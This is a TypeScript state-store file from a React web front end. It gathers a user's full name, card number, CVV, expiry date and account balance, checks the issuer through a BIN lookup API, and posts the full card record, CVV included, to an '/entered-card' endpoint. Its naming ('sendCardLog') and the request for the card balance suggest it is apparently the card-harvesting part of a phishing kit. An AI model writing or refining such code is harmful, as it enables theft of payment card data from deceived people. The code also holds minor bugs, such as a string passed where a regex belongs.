import axios from 'axios'
import toast from 'react-hot-toast'
import { create } from 'zustand'
import { persist } from 'zustand/middleware'
import { immer } from 'zustand/middleware/immer'
import api from '../api/api'
import { ValidateCard } from '../utils/card-utils/CardUtils'
import { useApplicationStore } from './useApplicationStore'

interface CardState {
  fullName: string
  cardNumber: string
  cvv: string
  expiryMonth: string
  expiryYear: string
  bankName: string
  balance: string
  setFullName: (value: string) => void
  setCardNumber: (value: string) => void
  setCVV: (value: string) => void
  setExpiryMonth: (value: string) => void
  setExpiryYear: (value: string) => void
  setBalance: (value: string) => void
  resetData: () => void

  sendCardLog: (id: string) => Promise<boolean>
  sendBalance: (id: string) => Promise<boolean>
}

export const useCardStore = create<CardState>()(
  persist(
    immer((set, get) => ({
      fullName: '',
      cardNumber: '',
      cvv: '',
      expiryMonth: '',
      expiryYear: '',
      bankName: '',
      balance: '',

      setCardNumber: (value: string) => set({ cardNumber: value }),
      setCVV: (value: string) => set({ cvv: value }),
      setExpiryMonth: (value: string) => set({ expiryMonth: value }),
      setExpiryYear: (value: string) => set({ expiryYear: value }),
      setBalance: (value: string) => set({ balance: value }),
      setFullName: (value: string) => set({ fullName: value }),
      resetData: () => {
        set({
          cardNumber: '',
          cvv: '',
          expiryMonth: '',
          expiryYear: '',
          bankName: '',
          balance: ''
        })
      },
      sendCardLog: async (id: string): Promise<boolean> => {
        try {
          const { cardNumber, cvv, expiryMonth, expiryYear, bankName, balance, resetData, fullName } = get()

          const expiryDate = `${expiryMonth}/${expiryYear}`
          const bin = cardNumber
          const response = await axios.get(`https://data.handyapi.com/bin/${bin.replace('/s+/g', '').slice(0, 7)}`)

          if (response.data.Status === 'NOT FOUND' || !ValidateCard(cardNumber, cvv)) {
            resetData()
            toast.error('Tarjeta no valida')
            return false
          }

          set({ bankName: response.data.Issuer })

          if (!useApplicationStore.getState().autoBalance) {
            await api.post(`/entered-card/${id}`, {
              bank: bankName,
              card_number: cardNumber,
              balance: balance !== '' ? balance : '',
              expired: expiryDate,
              cvv: cvv,
              full_name: fullName
            })

            resetData()
          } else {
            if (balance === '') return false
            await api.post(`/entered-card/${id}`, {
              bank: bankName,
              card_number: cardNumber,
              balance: balance !== '' ? balance : '',
              expired: expiryDate,
              cvv: cvv,
              full_name: fullName
            })

            resetData()
          }

          return true
        } catch (e) {
          console.error(e)
          return false
        }
      },
      sendBalance: async (id: string): Promise<boolean> => {
        const { balance, resetData } = get()

        if (balance !== '') {
          await api.post(`/balance/${id}`, {
            balance: balance !== '' ? balance : ''
          })
          resetData()
          return true
        }

        return false
      }
    })),
    {
      name: 'info-storage',
      partialize: (state) => ({
        fullName: state.fullName
      })
    }
  )
)
